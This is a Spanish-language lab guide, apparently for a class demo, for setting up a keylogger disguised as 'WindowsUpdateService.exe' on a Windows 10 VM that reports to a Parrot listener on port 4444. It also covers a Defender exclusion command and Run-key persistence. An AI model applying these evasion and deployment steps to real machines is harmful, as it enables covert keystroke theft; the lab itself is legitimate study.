# Setup completo — Parrot (atacante) + Windows 10 VM (víctima)

---

## Paso 1 — Configurar la red en VirtualBox

Hacer esto **una sola vez** antes de arrancar las VMs.

1. Abrir VirtualBox → `Archivo → Herramientas → Gestor de red`
2. Pestaña `Redes NAT` → clic en `Crear`
3. Queda una red llamada `NatNetwork` con rango `10.0.2.0/24`
4. En la VM Parrot: `Configuración → Red → Adaptador 1 → Conectado a: Red NAT → Nombre: NatNetwork`
5. En la VM Windows 10: mismo proceso

---

## Paso 2 — Obtener la IP de Parrot

Arrancar la VM Parrot y en una terminal:

```bash
ip addr show
```

Buscar la línea que diga `inet` bajo `eth0` o `enp0s3`. Ejemplo:

```
inet 10.0.2.4/24
```

Esa IP (`10.0.2.4` en este ejemplo) es la del atacante.

---

## Paso 3 — Actualizar config.py con la IP de Parrot

En tu Windows (donde está el código), abrir `config.py` y cambiar:

```python
SERVER_HOST = "10.0.2.4"   # ← poner la IP real de Parrot
```

Guardar el archivo.

---

## Paso 4 — Agregar exclusión en Windows Defender

Sin esto, Defender borra el .exe recién compilado.

Abrir **PowerShell como administrador** y ejecutar:

```powershell
Add-MpPreference -ExclusionPath "C:\Users\Nico\Documents\keylogger\dist"
```

O manualmente: `Seguridad de Windows → Protección contra virus → Exclusiones → Agregar exclusión de carpeta` → seleccionar la carpeta `dist`.

---

## Paso 5 — Compilar el .exe

En la carpeta del proyecto, doble clic en `build.bat` o ejecutar en terminal:

```cmd
build.bat
```

Esperar hasta que aparezca:
```
[OK] Ejecutable generado: dist\WindowsUpdateService.exe
```

El archivo queda en `C:\Users\Nico\Documents\keylogger\dist\WindowsUpdateService.exe`.

---

## Paso 6 — Transferir el .exe a la VM Windows 10

### Método A — Carpeta compartida (recomendado)

**En VirtualBox, con la VM Windows 10 apagada:**
1. Seleccionar VM Windows 10 → `Configuración → Carpetas compartidas`
2. Clic en el ícono de carpeta con `+`
3. Ruta de carpeta: `C:\Users\Nico\Documents\keylogger\dist`
4. Nombre: `dist`
5. Marcar `Automontar` y `Hacer permanente`
6. Aceptar

**Dentro de la VM Windows 10 encendida:**
- Abrir el Explorador de archivos
- En el panel izquierdo aparece `Red` o una unidad llamada `\\VBOXSVR\dist`
- Copiar `WindowsUpdateService.exe` al escritorio de la VM

> Si no aparece automáticamente: abrir el Explorador → barra de dirección → escribir `\\VBOXSVR\dist`

---

### Método B — Servidor HTTP (alternativa)

**En tu Windows (host), en la terminal:**
```cmd
cd C:\Users\Nico\Documents\keylogger\dist
python -m http.server 8080
```

**En la VM Windows 10**, abrir el navegador y entrar a:
```
http://10.0.2.2:8080
```
> `10.0.2.2` es la IP del host en redes NAT de VirtualBox.

Hacer clic en `WindowsUpdateService.exe` para descargarlo.

---

## Paso 7 — Instalar dependencias en Parrot

En la terminal de Parrot:

```bash
pip install cryptography
```

Copiar `server.py` y `config.py` a Parrot usando el mismo método (carpeta compartida o HTTP).

---

## Paso 8 — Ejecutar la demo

### En Parrot (hacer esto primero):

**Terminal 1 — servidor:**
```bash
python3 server.py
```
Debe mostrar: `[*] Escuchando en 0.0.0.0:4444`

**Terminal 2 — Wireshark:**
```bash
wireshark
```
- Seleccionar interfaz `eth0`
- Filtro: `tcp.port == 4444`
- Clic en el tiburón azul para iniciar captura

### En Windows 10 VM (después de que Parrot esté listo):

Doble clic en `WindowsUpdateService.exe` — no abre ninguna ventana, es correcto.

Escribir algunas palabras en el Bloc de notas u otra aplicación.

Esperar 30 segundos.

---

## Paso 9 — Verificar persistencia (reinicio)

**Antes de reiniciar**, abrir `regedit` en Windows 10 VM:
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```
Tomar screenshot de la entrada `WindowsUpdateService`.

Reiniciar la VM Windows 10. Al volver a iniciar sesión, el keylogger arranca solo y Parrot recibe datos de nuevo sin intervención.

---

## Checklist del setup

- [ ] Red NAT configurada en VirtualBox con ambas VMs
- [ ] IP de Parrot obtenida con `ip addr`
- [ ] `config.py` actualizado con la IP de Parrot
- [ ] Exclusión de Defender agregada para carpeta `dist`
- [ ] `build.bat` ejecutado → `WindowsUpdateService.exe` en `dist/`
- [ ] `.exe` copiado a VM Windows 10
- [ ] `cryptography` instalado en Parrot
- [ ] `server.py` y `config.py` copiados a Parrot
- [ ] Demo ejecutada: server.py → Wireshark → .exe en víctima
- [ ] Screenshot de regedit con la clave de persistencia
- [ ] Screenshot de regedit ANTES y datos recibidos DESPUÉS del reinicio
